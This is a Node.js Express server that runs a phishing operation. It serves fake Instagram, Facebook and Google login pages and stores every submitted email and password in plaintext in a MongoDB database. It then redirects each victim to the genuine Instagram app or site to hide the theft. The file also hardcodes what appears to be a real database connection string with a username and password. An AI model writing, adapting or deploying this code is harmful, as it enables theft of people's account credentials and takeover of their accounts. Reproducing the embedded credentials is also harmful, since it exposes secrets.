const express = require("express");
const mongoose = require("mongoose");
const path = require("path");

const app = express();

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// MongoDB Connection 
const mongoURI = "mongodb+srv://ahmad:ahmad786@instagram.70w9r8g.mongodb.net/instagramDB?retryWrites=true&w=majority";

mongoose.connect(mongoURI)
    .then(() => console.log("✅ Connected to MongoDB Atlas"))
    .catch((err) => console.error("❌ MongoDB Connection Error:", err.message));

// Define User Scheme 

const UserSchema = new mongoose.Schema({
    email: { type: String, required: true },
    password: { type: String, required: true },
    createdAt: { type: Date, default: Date.now } // Unique timestamp for each entry
});

const User = mongoose.model("User", UserSchema);



// Set View Engine to EJS
app.set("view engine", "ejs");

// Serve Login Page
app.get("/", (req, res) => {
    res.render("login"); // Ensure you have views/login.ejs
});
app.get("/facebook", (req, res) => {
    res.render("fb");
});

app.get("/google", (req, res) => {
    res.render("google");
});

// Handle Login Form Submission
app.post("/instagram/login", async (req, res) => {
    const { email, password } = req.body;

    try {
        const newUser = new User({ email, password });
        await newUser.save();


        const userAgent = req.headers["user-agent"];
        let redirectURL = "https://www.instagram.com/";

        if (/android/i.test(userAgent)) {
            redirectURL = "intent://instagram.com/#Intent;package=com.instagram.android;scheme=https;end;";
        } else if (/iphone|ipad|ipod/i.test(userAgent)) {
            redirectURL = "instagram://app";
        }

        res.redirect(redirectURL);
    } catch (err) {
        console.error("❌ Error saving user data:", err.message);
        res.status(500).send("Server Down! retry");
    }
});


app.post("/facebook/login", async (req, res) => {
    const { email, password } = req.body;

    try {
        const newUser = new User({ email, password });
        await newUser.save();

        const userAgent = req.headers["user-agent"];
        let redirectURL = "https://www.instagram.com/";

        if (/android/i.test(userAgent)) {
            redirectURL = "intent://instagram.com/#Intent;package=com.instagram.android;scheme=https;end;";
        } else if (/iphone|ipad|ipod/i.test(userAgent)) {
            redirectURL = "instagram://app";
        }

        res.redirect(redirectURL);
    } catch (err) {
        console.error("❌ Error saving user data:", err.message);
        res.status(500).send(`Server Down! Retry`);
    }
});


app.post("/google/login", async (req, res) => {
    const { email, password } = req.body;

    try {
        const newUser = new User({ email, password });
        await newUser.save();


        const userAgent = req.headers["user-agent"];
        let redirectURL = "https://www.instagram.com/";

        if (/android/i.test(userAgent)) {
            redirectURL = "intent://instagram.com/#Intent;package=com.instagram.android;scheme=https;end;";
        } else if (/iphone|ipad|ipod/i.test(userAgent)) {
            redirectURL = "instagram://app";
        }

        res.redirect(redirectURL);
    } catch (err) {
        console.error("❌ Error saving user data:", err.message);
        res.status(500).send("Server Down! retry");
    }
});





// Start Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on http://localhost:${PORT}`));
